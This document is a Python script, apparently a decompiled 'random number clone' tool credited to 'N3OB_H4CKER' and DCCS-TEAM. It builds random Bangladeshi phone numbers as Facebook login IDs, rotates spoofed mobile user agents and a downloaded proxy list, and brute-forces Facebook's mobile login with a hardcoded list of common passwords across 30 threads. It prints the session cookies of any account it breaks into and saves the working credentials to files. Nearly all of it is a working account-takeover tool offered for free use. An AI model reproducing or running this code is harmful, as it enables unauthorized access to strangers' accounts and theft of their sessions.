#ARIFIN DECOMPILE STORE
#YAAD RAKHNA



import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    os.system('pkg install espeak')

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='fr-fr; Redmi Note 11 Build/'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn

#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36

    aa='Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    

    aa='Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

    aa='Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

	

    aa='Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    aa='Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

os.system('xdg-open https://github.com/N3OBH4CKER')



logo = ("""

\x1b[1;91m██████   ██████  ██████ ███████       ████████ ███████  █████  ███    ███ 

\033[1;32m██   ██ ██      ██      ██               ██    ██      ██   ██ ████  ████ 

\033[1;31m██   ██ ██      ██      ███████ █████    ██    █████   ███████ ██ ████ ██ 

\x1b[1;94m██   ██ ██      ██           ██          ██    ██      ██   ██ ██  ██  ██ 

\x1b[1;96m██████   ██████  ██████ ███████          ██    ███████ ██   ██ ██      ██ 

            

                                  \x1b[1;96m𝙉 \x1b[1;94m𝙏 \033[1;31m𝘼𝙡𝙞𝙛 \033[1;32m𝙎𝙝𝙚𝙞𝙠𝙝                                                  



     \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m═DCCS-TEAM═\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══

     \x1b[1;96m Author       : \033[1;32m        𝙽3𝙾𝙱_𝙷4𝙲𝙺𝙴𝚁

     \x1b[1;96m Facebook     :  \033[1;32m        𝙉 𝙏 𝘼𝙡𝙞𝙛 𝙎𝙝𝙚𝙞𝙠𝙝

     \x1b[1;96m GitHub       : \033[1;32m         DCCS-TEAM 

     \x1b[1;96m Tool Status  : \033[1;32m  FREE X ENJOY

     \x1b[1;96m Team         : \033[1;32m   DCCS X N3OB-H4CKER

     \x1b[1;96m Tool Work    :  \033[1;32m  ONLY DATA

     \x1b[1;96m Version      : \033[1;32m           1.0.1

     \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m═DCCS-TEAM═\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══

""")                                              



class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)

        os.system('espeak -a 200 "Welcome Noob Hacker project Random Clone"')

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═DCCS-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By N3OB]")

        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[𝙉 𝙏 𝘼𝙡𝙞𝙛 𝙎𝙝𝙚𝙞𝙠𝙝] ")

        print(" [00] Exit")

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═DCCS-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        Alif =input(" [?] Choose : ")

        os.system('xdg-open https://facebook.com/groups/1781194432004610/')

        if Alif in ["1", "01"]:

            num()

        if Alif in ["2","02"]:

            os.system('xdg-open https://facebook.com/100074591152479')

        if Alif in [" 0", "00"]:

            exit()

        else:

            exit()

def num():

    user=[]

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')

    os.system('espeak -a 200 "Select your Number"')

    kode = input(' [?] Enter sim code: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')

    os.system('espeak -a 200 "select Crack Limit"')

    limit = int(input(' [?] Crack Your Limit : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as noob:

        os.system('clear')

        print(logo)

        os.system('espeak -a 200 "Random cloning Started Noob Hacker"')

        tl = str(len(user))

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)

        print(' \033[1;97m[+] Process has been started')

        print(' \033[1;97m[+] Wait for ids ')

        print(' \033[1;97m[+] Use flight mode for speed up ')

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx=[guru,'khan786','khan1122','khan12','janjan','123456','112233','12345678','12341234','zxcvbnm','love@@@','king11','1234567890','09876543','0987654321','87654321','112211','police','Sadiya','Nadiya','Rakib12', 'mim123', 'shanto', 'Shanto', 'sumaiya', 'single boy','game lover', 'rifat12','Rifat@@','Shakib','shakib','emon12','madarcud', 'condom', 'cudacudi', 'islam12','raihan', 'bikelover', 'Bike lover', 'India love', 'shuvo12','Shuvo11','sunny leone', 'sunnyleon' ,'Jonnysing','samiya','Samiya','lamiya', 'Khadija','Krishna','cobra12','hotboy','rupa123', 'raisa123', '654321' ,'smart boy','fflover', 'ff1234', 'lover boy', 'I love you', 'iloveyou', 'love1234', 'king1334', 'queen123', 'khan123', 'freefire', 'free fire', 'pubg12', 'sex1234', 'boss1234', 'loverboy', 'dragon', 'danger', 'football', 'lovemessi', 'messi123', 'kingmessi', 'naymer jr', 'namerjr', 'king@@','bossmessi', 'gamelover', 'allah123', 'sexyboy', 'badboy' 'badgiral' ,'sex life', '001100','12340000','123321','0000000','11111111','88888888','666666',]

            noob.submit(rcrack1,uid,pwx,tl)

    print(' [+] Crack process has been completed')

    print(' [+] Ids saved in ok.txt,cp.txt')



def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\033[1;92mN3OB_𝙷4𝙲𝙺𝙴𝚁\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://mbasic.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {
        'authority': 'x.facebook.com',
         'method': 'POST',
     'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': pro}

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[N3OB-OK💚] {uid} | {ps}")

                print(f" Cookie : {coki}")

                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"\x1b[38;5;196m[N.T ALIF-CP🔪] {uid}|{ps}")

                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[m[N3OB_𝙷4𝙲𝙺𝙴𝚁🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

Main()